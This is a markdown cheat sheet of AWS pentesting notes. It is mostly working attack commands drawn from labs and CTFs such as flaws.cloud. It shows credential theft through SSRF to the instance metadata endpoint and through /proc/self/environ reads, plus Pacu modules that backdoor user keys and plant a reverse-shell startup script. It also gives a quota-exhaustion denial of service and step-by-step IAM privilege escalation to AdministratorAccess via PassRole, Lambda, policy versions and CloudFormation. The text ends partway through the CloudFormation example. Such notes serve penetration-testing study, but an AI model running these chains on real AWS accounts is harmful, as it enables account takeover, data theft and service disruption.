---
title: AWS
badge: Cloud Pentesting
---

Credits go to `@snooze`

## Interesting resources

**Search public buckets**

https://buckets.grayhatwarfare.com/

**Search public images**

https://aws.amazon.com/marketplace/search/results?searchTerms=wazuh

**IAM API Documentation**

https://docs.aws.amazon.com/IAM/latest/APIReference/API_Operations.html

**Gaining persistence on lambda**

[https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

**Privilege Scalation in AWS**

[https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws](https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws)

**Dorks**

```bash
"arn:aws" [forums.aws.amazon.com](http://forums.aws.amazon.com/)
```

**Pacu - Open Source AWS exploitation framework**

[https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)

```bash
set_keys
swap_keys
run confirm_permissions # search permissions
whoami

run enum_ec2 --instances

run privesc_scan
run iam__enum_permissions
whoami # new policy created

run enum_ec2 --instances # created

services # shows services with data

run backdoor_users_keys

run add_ec2_startup_sh_script --script ./tmp/reverse-shell.sh
run download_ec2_userdata
```

## Miscellaneous commands

```bash
# Configure AWS CLI
aws configure
# Configure AWS CLI with profile
aws configure --profile "{{ profile luastan }}"

# Get the user to whom the token corresponds
aws --profile flaws sts get-caller-identity

# Set environment variables for using with AWS CLI
export AWS_ACCESS_KEY_ID="{{ AWS-ACCESS-KEY-ID ASI... }}"
export AWS_SECRET_ACCESS_KEY="{{ AWS-SECRET-ACCESS-KEY AQE5/... }}"
export AWS_SESSION_TOKEN="{{ AWS-SESSION-KEY IQo... }}"

# Unset environment variables (in fish)
set -e AWS_ACCESS_KEY_ID; set -e AWS_SECRET_ACCESS_KEY; set -e AWS_SESSION_TOKEN

# AKIA prefix is long tern
# ASIA prefix is temporary security credentials
```

The regions in which a aws machine could be are the following ones:

```bash
us-east-2
us-east-1
us-west-1
us-west-2
af-south-1	
ap-east-1	
ap-south-1	
ap-northeast-3	
ap-northeast-2	
ap-southeast-1	
ap-southeast-2	
ap-northeast-1	
ca-central-1	
eu-central-1	
eu-west-1	
eu-west-2
eu-south-1	
eu-west-3	
eu-north-1	
me-south-1	
sa-east-1	
us-gov-east-1	
us-gov-west-1
```

The IP ranges of amazon are:

```bash
wget -q https://ip-ranges.amazonaws.com/ip-ranges.json
cat ip-ranges.json | jq '.prefixes[] | select(.region=="us-west-2") | select(.service=="EC2") | .ip_prefix'
```

## Public enumeration

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html secret-dd02c7c.html --no-sign-request --region us-west-2
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2

# Authenticated but unrestricted
aws s3 --profile flaws ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

# Authenticated but unrestricted snapshots
aws --profile "{{ profile luastan }}" ec2 describe-snapshots --filter "Name=volume-id,Values=vol-04f1c039bc13ea950" --region us-west-2
# SNAPSHOTS               False   975426262029    100%    snap-0b49342abd1bdcb89  2017-02-28T01:35:12.000Z        completed       vol-04f1c039bc13ea950   8
aws --profile "{{ profile luastan }}" ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
# Create a EC instance in the same zone (Make sure to choose free tiers)
# While creating the EC2 instance attach the previously created volume from the snapshot
ssh ec2-user@ec2-52-43-103-64.us-west-2.compute.amazonaws.com -i flaws.pem
	lsblk
	sudo file -s /dev/xvdb1
	sudo mount /dev/xvdb1 /mnt
	cd /mnt # and search everything there

# Bruteforce AWSBuckets
git clone https://github.com/jordanpotti/AWSBucketDump
python3 AWSBucketDump -l ../wordlist1.txt -m 5000000 -D -d loot -t 5

# IAM cross-account enumeration
nano assume-role-doc.json
	{
	    "Version": "2012-10-17",
	    "Statement": [
	        {
	            "Effect": "Allow",
	            "Principal": {
	                "AWS":"*"
	            },
	            "Action": "sts:AssumeRole",
	            "Condition": {}
	        }
	    ]
	}

# you can also create it in the console under iam>roles
aws iam create-role --role-name test --assume-role-policy-document file://assume-role-doc.json

# Use pacu iam__enum_roles as well
run iam__enum_users --word-list ad-names.txt --role-name test --account-id 276384657722
run iam__enum_roles --word-list ad-names.txt --role-name test --account-id 276384657722
```

## Another public vulnerabilities related to AWS

### Poor lambda authorizer

It kinda caches the authorization from one request to the other

```bash
http https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/status
http https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/status "Authorization: asdfsdf"
http https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/admin
http https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/admin "Authorization: asdfsdf"
```

### Denial of service if the service has a quota

```bash
# In the console go to API Gateway > Desired path & mehtod
# In stages you can get the URL
https://ur2b3zsn43.execute-api.us-east-1.amazonaws.com/dev/status
# Usage plan has the limits of the quota
# In API Keys you can check the API key clicking Show
# After that just repeat the request several times
http https://ur2b3zsn43.execute-api.us-east-1.amazonaws.com/dev/status "x-api-key: oNvNo5p2DP9z3wHK0pK456EzfdpY1MFr65bXwLmr"
```

### IAM based Authentication

This happens when some api only requires a IAM user but not from a specific company so an attacker might be able to use its own, for example postman has built-in support for AWS signatures

```bash

http https://quxie58r0l.execute-api.us-east-1.amazonaws.com/default/

Postman > Authorization > AWS Signature
```

### Misconfigured private API

There may be an API that is only accessible inside a default VPC so therefore an attacker might be able to create an ec2 instance in the same VPC and access it

```bash
# Enumeration (not required)
aws apigateway get-rest-apis # Here it shows the resource policy
aws apigateway get-resources --rest-api-id ad4j6l419l
aws apigateway get-method --rest-api-id ad4j6l419l --http-method GET --resource-id a44akc
# aws apigateway get-models --rest-api-id ad4j6l419l
aws apigateway get-stages --rest-api-id ad4j6l419l
aws apigateway get-stage --rest-api-id ad4j6l419l --stage-name dev
# Fuck this, check it in the aws console, although you can craft the URL
https://ad4j6l419l.execute-api.us-east-1.amazonaws.com/dev/v1

# In your own account
	# Create an EC2 instance
	curl https://ad4j6l419l.execute-api.us-east-1.amazonaws.com/dev/v1 # fail
	
	# Go to vpc > Security Groups > New
	# Go to endpoints > Create one
	#   Service: execute-api
	#   Security Groups: all-access
	
	curl https://ad4j6l419l.execute-api.us-east-1.amazonaws.com/dev/v1
	Flag: 43a3866a6a360a70219f7e387a1e528
```

## Public vulnerabilities to get the token

You can use

```bash
# Comands to get env variables
printenv
cat /proc/self/env

# Files to get env variables
file:///etc/environment
file:///proc/self/environ
php://filter/read=convert.base64-encode/resource=file:///proc/self/environ

# SSRF
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws

# Read events (which contains temporary tokens)
python -c 'from urllib import request,parse; response=request.urlopen(\"http://127.0.0.1:9001/2018-06-01/runtime/invocation/next\"); output=response.read().decode(\"utf-8\"); print(output)'
```

## Info gathering post-token

```bash
aws configure

aws sts get-caller-identity # whoami
aws iam list-groups-for-user # list groups
aws iam list-user-policies --user-name <username> # list user-policies
aws iam get-user-policy --user-name <username> --policy-name <policy_name>

aws iam get-user
aws iam list-users
aws iam list-groups
aws iam list-roles
```

### EC2 - Elastic Compute Cloud

```bash
# List ec2 instances
aws ec2 describe-instances --region <region>
# The ec2 UserData attribute sometimes contains interesting base64 encoded data
aws aws ec2 describe-instance-attribute --attribute userData --instance-id <instance> --region <region>
# Search image
aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
aws ec2 describe-subnets
    subnet-0ef5e6ddecf690647
aws ec2 describe-security-groups
# Run instance
aws ec2 run-instances --subnet-id subnet-0ef5e6ddecf690647 --image-id ami-03e8f862f1241c4ed --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-0774f5fb08aacf4fd"
	aws ssm send-command \
	    --document-name "AWS-RunShellScript" \
	    --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
	    --targets "Key=instanceids,Values=i-0661c37054c5422d4" \
	    --comment "get_token"
	aws ssm get-command-invocation \
	    --command-id "8b408f10-6af1-4272-80b2-3f3edd27ebc4"\
	    --instance-id "i-0661c37054c5422d4"

```

### S3 - Simple Storage Service - Buckets

```bash
curl https://s3.amazonaws.com/a700de6aeab6ef373e7d/flag.txt
curl https://a700de6aeab6ef373e7d.s3.amazonaws.com/flag.txt
# There are pre-signed URLs. Pre-signed URLs have five pieces of information; bucket, object, access key, signature, and expiration. awscli tends to present them in this form:
curl https://<bucket>.s3.amazonaws.com/<object>?AWSAccessKeyId=<key>&Expires=<expiration>&Signature=<signature>

# List buckets
aws s3api list-buckets
aws s3api list-buckets --endpoint-url http://s3.bucket.htb
aws s3 cp hello.txt s3://adserver/images/ --endpoint-url http://s3.bucket.htb
# List files using api1
aws s3api list-objects --bucket data-extractor-repo
# List files using api2
aws s3 ls s3://developers-secret-bucket/dave-shared-bucket/ --region us-east-2
# Get file
aws s3 cp s3://developers-secret-bucket/dave-shared-bucket/flag.txt . --region us-east-2
# Get policy of bucket
# (Policies may contain existing files, conditions or credentials)
aws s3api get-bucket-policy --bucket users-personal-files --output=text | jq
# Get different versions of bucket
aws s3api list-object-versions --bucket data-extractor-repo
  aws s3api get-object --bucket data-extractor-repo --key DataExtractor.zip --version-id S5l9yGDb_u0XR96U3tQexZMtmn1t6HUZ latest.zip
# Check if policy can be overwritten
aws s3api get-bucket-policy --bucket s3-writable-policy-730543879631  --output text | jq > policy.json
	# Moficy the policy to grant acces "Effect": Allow
	aws s3api put-bucket-policy --bucket s3-writable-policy-730543879631 --policy file://policy.json
# Check if ACL can be overwritten ("Permission": "WRITE_ACP")
aws s3api get-bucket-acl --bucket s3-secret-267551706062 | jq
	nano acl.json
		{
		    "Owner": {
		        "DisplayName": "jeswincloud+1615520716073",
		        "ID": "8dcd4082d0cb63a48808bdbafbbff5e955a906eca6fb9815b423ac85e0148669"
		    },
		    "Grants": [
		        {
		            "Grantee": {
		                "Type": "Group",
		                "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
		            },
		            "Permission": "FULL_CONTROL" # As much permissions as possible
		        }
		    ]
		}
	aws s3api put-bucket-acl --bucket s3-secret-267551706062 --access-control-policy file://acl.json
# Writable object ACL (Similar to writable bucket ACL but restricted to an object)
# It may be interesting to edit an already existing javascript file to exfiltrate info
aws s3api get-object-acl --bucket s3-secret-258803314955 --key flag
  aws s3api put-object-acl --bucket s3-secret-258803314955 --key flag --access-control-policy file://objacl.json
```

### Lambda

```bash
# List lambda functions
aws lambda list-functions | jq -r .Functions[].FunctionName
# Get code from lambda function
aws lambda get-function --function-name serverlessrepo-image-uploader-uploader-RM72CSUT4KDA --region ap-southeast-1
# Find URL of lambda function
aws apigateway get-rest-apis --region ap-southeast-1
aws apigateway get-stages --rest-api-id cwlw44ht84 --region ap-southeast-1
# Get resources of api (May contain required headers and other interesting stuff)
aws apigateway get-resources --rest-api-id wjpu20uslg --region us-west-2
# List layers (each layer is a set of packages so it is used for dependencies)
aws lambda list-layers
	aws lambda list-layer-versions --layer-name php-runtime
	# Download layer version
	aws lambda get-layer-version --layer-name php-runtime --version-number 2
# List event-source-mappings
aws lambda list-event-source-mappings --function-name xxe-handler

```

### Logs

```bash
# List logs
aws logs describe-log-groups --region us-east-1
# List log streams
aws logs describe-log-streams --log-group-name /aws/lambda/DataExtractor --region us-east-1 | jq ".logStreams[].logStreamName"
# Dump logs
aws logs get-log-events --log-group-name /aws/lambda/DataExtractor --log-stream-name '2020/10/29/[$LATEST]81c6e324b37a46baa2078ba80d1f99bc' --start-time 1603674938 --region us-east-1 > out.log
aws logs get-log-events --log-group-name /aws/lambda/DataExtractor --log-stream-name '2020/10/29/[1]2bca12fd29694c788bb259dd2e25d609' --start-time 1603674938 --region us-east-1 >> out.log
[...]

```

### DynamoDB

```bash
aws dynamodb list-tables --region us-east-1
aws dynamodb scan --table-name CardDetails --region us-east-1

aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
```

## Secrets manager

```bash
aws secretsmanager list-secrets --profile aws-ctf --region us-west-2
aws secretsmanager get-secret-value --secret-id redacted_flag_secret_main --version-stage AWSCURRENT --region us-west-2 --profile aws-ctf
```

## Privilege Escalation

```bash
aws iam list-users | jq '.Users[].UserName'
aws iam list-groups-for-user --user-name ad-Adminson | jq
aws iam list-user-policies --user-name ad-Adminson | jq
aws iam list-attached-user-policies --user-name ad-Adminson | jq
aws iam list-signing-certificates --user-name ad-Adminson | jq
aws iam list-ssh-public-keys --user-name ad-Adminson | jq
aws iam get-ssh-public-key --user-name ad-User --encoding PEM --ssh-public-key-id  APKAUAWOPGE5M47NZEIT| jq
aws iam list-mfa-devices | jq # Second factors
aws iam list-virtual-mfa-devices | jq
aws iam get-login-profile --user-name ad-User | jq
aws iam list-groups | jq
aws iam list-group-policies --group-name ad-Admin | jq
aws iam list-attached-group-policies --group-name ad-Admin | jq
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess | jq
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1| jq
aws iam list-policies | jq
aws iam list-roles | jq
aws iam get-role --role-name ad-loggingrole | jq
aws iam list-role-policies --role-name ad-loggingrole | jq
aws iam list-attached-role-policies --role-name ad-loggingrole | jq
aws iam list-policy-versions --policy-arn <arn>
```

### Misconfigured Trust Policy

```bash
# Misconfigured Trust Policy
# Asume a role with more privs
aws aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging # This returns temporary credentials to export
aws sts get-caller identity # should return the role
aws iam list-attached-role-policies --role-name ad-LoggingRole
aws s3 ls # list all buckets
```

### Overly Permissive Permission

```bash
# Overly Permissive Permission (https://labs.bishopfox.com/tech-blog/privilege-escalation-in-aws)
# Look if we have some of these permissions
# 01 - iam:CreatePolicyVersion
# 02 - iam:SetDefaultPolicyVersion
# 03 - iam:PassRole and ec2:RunInstances
# 04 - iam:CreateAccessKey
# 05 - iam:CreateLoginProfile
# 06 - iam:UpdateLoginProfile
# 07 - iam:AttachUserPolicy
# 08 - iam:AttachGroupPolicy
# 09 - iam:AttachRolePolicy
# 10 - iam:PutUserPolicy
# 11 - iam:PutGroupPolicy
# 12 - iam:PutRolePolicy
# 13 - iam:AddUserToGroup
# 14 - iam:UpdateAssumeRolePolicy
# 15 - iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction
# 16 - iam:PassRole, lambda:CreateFunction,and lambda:CreateEventSourceMapping
# 17 - lambda:UpdateFunctionCode
# 18 - iam:PassRole, glue:CreateDevEndpoint, and glue:GetDevEndpoint(s)
# 19 - glue:UpdateDevEndpoint and glue:GetDevEndpoint(s)
# 20 - iam:PassRole, cloudformation:CreateStack,and cloudformation:DescribeStacks
# 21 - iam:PassRole, datapipeline:CreatePipeline,datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline

# Example 1
	# There is a policy that allows to attach any policy to any user so we attach AdministratorAccess policy to our user
	aws iam list-attached-user-policies --user-name student
	aws iam get-policy --policy-arn arn:aws:iam::098453768990:policy/Service
	aws iam get-policy-version --policy-arn arn:aws:iam::098453768990:policy/Service --version-id v1 # allow to all accounts and all users
	{
	    "PolicyVersion": {
	        "Document": {
	            "Statement": [
	                {
	                    [...]
	                    "Resource": "arn:aws:iam::*:user/*"
	                }
	            ]
	        },
	        [...]
	    }
	}
	aws ec2 describe-instances # fail
	aws iam create-user --user-name Bob # fail
	aws iam list-policies | grep 'AdministratorAccess'
	aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
	aws iam list-attached-user-policies --user-name student # here we are admin
	aws ec2 describe-instances # works
	aws iam create-user --user-name Bob # works

# Example 2
	aws iam get-user
	aws iam list-attached-user-policies --user-name student
	aws iam list-user-policies --user-name student
	aws iam get-user-policy --user-name student --policy-name terraform-2021080909014237740000000
	{
	    "UserName": "student",
	    "PolicyName": "terraform-20210809090142377400000001",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": [
	                    "iam:CreateLoginProfile",
	                    "iam:ChangePassword" # kinda interesting isn't it but cannot use it because it is only for a specific user
	                ],
	                "Effect": "Allow",
	                "Resource": "*"
	            }
	        ]
	    }
	}
	aws iam list-users
	aws iam list-attached-user-policies --user-name AdminBob
	aws iam get-login-profile --user-name AdminBob
	aws iam create-login-profile --user-name AdminBob --password abcd@12345 --no-password-reset-required # He needs to not be created
	# login into console
```

### Dangerous Policy Combination

```bash
# Example 1
	aws iam list-attached-user-policies --user-name student
	aws iam list-user-policies --user-name student
	aws iam get-user-policy --user-name student --policy-name terraform-20210809091722956800000002
	{
	    "UserName": "student",
	    "PolicyName": "terraform-20210809091722956800000002",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": [
	                    "sts:AssumeRole"
	                ],
	                "Effect": "Allow",
	                "Resource": [
	                    "arn:aws:iam::969445348526:role/Adder",
	                    "arn:aws:iam::969445348526:role/Attacher"
	                ]
	            }
	        ]
	    }
	}
	# So out user can asume both Adder and Attacher role
	aws iam list-role-policies --role-name Adder
	aws iam get-role-policy --role-name Adder --policy-name AddUser
	{
	    "RoleName": "Adder",
	    "PolicyName": "AddUser",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": "iam:AddUserToGroup",
	                "Effect": "Allow",
	                "Resource": "arn:aws:iam::969445348526:group/Printers"
	            }
	        ]
	    }
	}
	aws iam list-role-policies --role-name Attacher
	aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy
	{
	    "RoleName": "Attacher",
	    "PolicyName": "AttachPolicy",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": "iam:AttachGroupPolicy",
	                "Effect": "Allow",
	                "Resource": "arn:aws:iam::969445348526:group/Printers"
	            }
	        ]
	    }
	}
	# Adder -> Can add a user to the group Printers
	# Attacher -> Can attach any group policy to the members of Printer's group
	# Action plan: Add our user to printers and attach AdministratorAccess to it
	# Step 1 Add user to Printers
	aws sts assume-role --role-arn arn:aws:iam::969445348526:role/Adder --role-session-name adder_test
	aws iam add-user-to-group --group-name Printers --user-name student
	aws iam list-groups-for-user --user-name student # now it belongs to printers
	set -e AWS_ACCESS_KEY_ID; set -e AWS_SECRET_ACCESS_KEY; set -e AWS_SESSION_TOKEN
	# Step 2 Attach AdministratorAccess polity
	aws iam list-policies | grep 'AdministratorAccess'
	aws sts assume-role --role-arn arn:aws:iam::969445348526:role/Attacher --role-session-name attacher_test
	aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
	set -e AWS_ACCESS_KEY_ID; set -e AWS_SECRET_ACCESS_KEY; set -e AWS_SESSION_TOKEN
	# Now we are admin
	aws iam list-attached-group-policies --group-name Printers

# Example 2
	aws iam list-attached-user-policies --user-name student
	aws iam list-user-policies --user-name student
	aws iam get-user-policy --user-name student --policy-name terraform-20210809111909517900000003
	                "Resource": [
	                    "arn:aws:iam::627930269833:role/Adder",
	                    "arn:aws:iam::627930269833:role/PolicyUpdater"
	                ]
	aws iam list-role-policies --role-name Adder
	aws iam list-role-policies --role-name PolicyUpdater
	aws iam get-role-policy --role-name Adder --policy-name AddUser
	{
	    "RoleName": "Adder",
	    "PolicyName": "AddUser",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": "iam:AddUserToGroup",
	                "Effect": "Allow",
	                "Resource": "arn:aws:iam::627930269833:group/Printers"
	            }
	        ]
	    }
	}
	aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion
	{
	    "RoleName": "PolicyUpdater",
	    "PolicyName": "CreatePolicyVersion",
	    "PolicyDocument": {
	        "Version": "2012-10-17",
	        "Statement": [
	            {
	                "Action": "iam:CreatePolicyVersion",
	                "Effect": "Allow",
	                "Resource": "arn:aws:iam::627930269833:policy/Print"
	            }
	        ]
	    }
	}
	# So the Idea here is to add the user to the group Printers and then edit the policy Print in order to make it behave like AdministratorAccess
	# Step 1 Add user to group
	aws sts assume-role --role-arn arn:aws:iam::627930269833:role/Adder --role-session-name adder_test
	aws iam add-user-to-group --group-name Printers --user-name student
	# Step 2 Add AsministratorAccess policy
	aws sts assume-role --role-arn arn:aws:iam::627930269833:role/PolicyUpdater --role-session-name pu_test
	# Look the policy that we can modify
	aws iam list-attached-group-policies --group-name Printers
	{
	    "AttachedPolicies": [
	        {
	            "PolicyName": "Print",
	            "PolicyArn": "arn:aws:iam::627930269833:policy/Print"
	        }
	    ]
	}
	# Just allows to list buckets for the moment
	aws iam get-policy-version --policy-arn arn:aws:iam::627930269833:policy/Print --version-id v1
	{
	    "PolicyVersion": {
	        "Document": {
	            "Version": "2012-10-17",
	            "Statement": [
	                {
	                    "Action": "s3:ListAllMyBuckets",
	                    "Effect": "Allow",
	                    "Resource": "*"
	                }
	            ]
	        },
	        "VersionId": "v1",
	        "IsDefaultVersion": true,
	        "CreateDate": "2021-08-09T09:46:23Z"
	    }
	}
	# Check the objective policy
	aws iam list-policies | grep 'AdministratorAccess'
	aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1
	{
	    "PolicyVersion": {
	        "Document": {
	            "Version": "2012-10-17",  
	            "Statement": [
	                {
	                    "Effect": "Allow",
	                    "Action": "*",    
	                    "Resource": "*"   
	                }
	            ]
	        },
	        [...]
	    }
	}
	# Create new policy version which is basically AdministratorAccess with another name
	aws iam create-policy-version --policy-arn arn:aws:iam::627930269833:policy/Print --policy-document file://NewPolicyVersion.json --set-as-default
	nano NewPolicyVersion.json
	{
	    "Version": "2012-10-17",  
	    "Statement": [
	        {
	            "Effect": "Allow",
	            "Action": "*",    
	            "Resource": "*"   
	        }
	    ]
	}
	aws iam create-user --user-name Bob # works
```

### Pass Role: EC2

```bash
# An user has a policy that allows to use PassRole and also ec2 permissions
# There is a role that is basically an admin
# So therefore we can instantiate an ec2 instance and get access to the admin role
aws iam list-user-policies --user-name student
aws iam get-user-policy --user-name student --policy-name ConfigureEC2Role
{
    "UserName": "student",
    "PolicyName": "ConfigureEC2Role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "iam:PassRole",
                    "ec2:RunInstances",
                    "ec2:Describe*",
                    "ec2:TerminateInstances",
                    "ssm:*"
                ],
                "Resource": "*"
            }
        ]
    }
}
aws iam get-role-policy --role-name ec2admin --policy-name terraform-20210810094410508000000003
{
    "RoleName": "ec2admin",
    "PolicyName": "terraform-20210810094410508000000003",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
}
# Search image, subnets, security groups and profiles
aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
    ami-03e8f862f1241c4ed
aws ec2 describe-subnets
    subnet-0ef5e6ddecf690647
aws ec2 describe-security-groups
    {  
        "Description": "FullAccess",
        "GroupName": "FullAccess",
        "IpPermissions": [
            {
                "IpProtocol": "-1",
                "IpRanges": [
                    {
                        "CidrIp": "0.0.0.0/0"
                    }
                ],
                "Ipv6Ranges": [],
                "PrefixListIds": [],
                "UserIdGroupPairs": []
            }
        ],
        "OwnerId": "392049719150",
        "GroupId": "sg-0774f5fb08aacf4fd",
        [...]
    }
aws iam list-instance-profiles
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_admin",
            "InstanceProfileId": "AIPAVWR7365XGDLUJVK7S",
            "Arn": "arn:aws:iam::392049719150:instance-profile/ec2_admin",
            "CreateDate": "2021-08-10T09:44:10Z",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2admin",
                    "RoleId": "AROAVWR7365XNCVXSOWXP",
                    "Arn": "arn:aws:iam::392049719150:role/ec2admin",     
                    "CreateDate": "2021-08-10T09:44:10Z",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
# create instance
aws ec2 run-instances --subnet-id subnet-0ef5e6ddecf690647 --image-id ami-03e8f862f1241c4ed --iam-instance-profile Name=ec2_admin --instance-type t2.micro --security-group-ids "sg-0774f5fb08aacf4fd"
    i-0661c37054c5422d4
aws ssm send-command \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
    --targets "Key=instanceids,Values=i-0661c37054c5422d4" \
    --comment "get_token"
aws ssm get-command-invocation \
    --command-id "8b408f10-6af1-4272-80b2-3f3edd27ebc4"\
    --instance-id "i-0661c37054c5422d4"
# Set tokens
aws iam create-user --user-name Bob
```

### Pass Role: Lambda

```bash
# We can use passrole and create a function
# There is a role which allow to attach a policy to any user
# Step 1 create a lambda function with the role
# Step 2 attach admin policy to our user
aws iam list-attached-user-policies --user-name student #IAMReadOnlyAccess
aws iam list-user-policies --user-name student
aws iam get-user-policy --user-name student --policy-name terraform-20210810090257756500000001
                "Action": [
                    "iam:PassRole", # Interesting
                    "lambda:CreateFunction",
                    "lambda:InvokeFunction",
                    "lambda:List*",
                    "lambda:Get*",
                    "lambda:Update*"
                ],
                "Effect": "Allow",
                "Resource": "*"
aws iam get-roles 
# When we create a service rule it can only be assumed for the service it was created
    {
      "Path": "/",
      "RoleName": "lab11lambdaiam",
      "RoleId": "AROASQYXFLCWU7TN5YPZ6",
      "Arn": "arn:aws:iam::173457889453:role/lab11lambdaiam",
      "CreateDate": "2021-08-10T09:02:57Z",
      "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Effect": "Allow",
            "Principal": {
              "Service": "lambda.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
          }
        ]
      },
      "MaxSessionDuration": 3600
    },
aws iam get-role --role-name lab11lambdaiam
aws iam list-role-policies --role-name lab11lambdaiam
aws iam get-role-policy --role-name lab11lambdaiam --policy-name terraform-20210810090257885700000003 # This is the role that we want to achieve
    {
        "RoleName": "lab11lambdaiam",
        "PolicyName": "terraform-20210810090257885700000003",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "iam:AttachUserPolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        }
    }
# code for the lambda function
nano evil.py
    import boto3

    def handler(event, context):
        iam = boto3.client("iam")
        response = iam.attach_user_policy(
            UserName="student", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
    return response
zip evil.zip evil.py
aws lambda create-function --function-name evil-function --runtime python3.8 --zip-file fileb://evil.zip --handler evil.handler --role "arn:aws:iam::173457889453:role/lab11lambdaiam"
aws lambda invoke --function-name evil-function output.txt

aws iam list-attached-user-policies --user-name student
aws iam create-user --user-name Bob
```

### Pass Role: Cloud formation

```bash
# We need the passrole permission as well as the cloudformation permissiones
# We also have a vulnerable role that allows PutUserPolicy (to update a policy)
# We asume the role and create a cloudformation task that updates a policy
aws iam list-attached-user-policies --user-name student
aws iam list-user-policies --user-name student
aws iam get-user-policy --user-name student --policy-name terraform-20210810112513458300000001
{
    "UserName": "student",
    "PolicyName": "terraform-20210810112513458300000001",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:PassRole",
                    "cloudformation:Describe*",
                    "cloudformation:List*",
                    "cloudformation:Get*",
                    "cloudformation:CreateStack",
                    "cloudformation:UpdateStack",
                    "cloudformation:ValidateTemplate",
                    "cloudformation:CreateUploadBucket"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
aws iam list-roles
    {
      "Path": "/",
      "RoleName": "lab12CFDeployRole",
      "RoleId": "AROA2MBR3YMUE3N7WOKOI",
      "Arn": "arn:aws:iam::713069151016:role/lab12CFDeployRole",
      "CreateDate": "2021-08-10T10:27:20Z",
      "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Effect": "Allow",
            "Principal": {
              "Service": "cloudformation.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
          }
        ]
      },
      "MaxSessionDuration": 3600
    },
aws iam list-role-policies --role-name lab12CFDeployRole
aws iam get-role-policy --role-name lab12CFDeployRole --policy-name terraform-20210810102720786900000003
{
    "RoleName": "lab12CFDeployRole",
    "PolicyName": "terraform-20210810102720786900000003",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:PutUserPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
aws cloudformation describe-stacks

# lab12CFDeployRole has permissions to alter the policies
nano new_policy.json
{
    "Resources":{
        "EvilTemplate":{
            "Type": "AWS::IAM:Policy",
            "Properties": {
                "PolicyName":"admin_policy",
                "PolicyDocument": {
                    "Version": "2012-10-17",
                    "Statement":{
                        "Effect": "Allow",
                        "Action": "*",
                        "Resource": "*"
                    }
                },
                "Users": ["student"]
            }
        }
    }
}
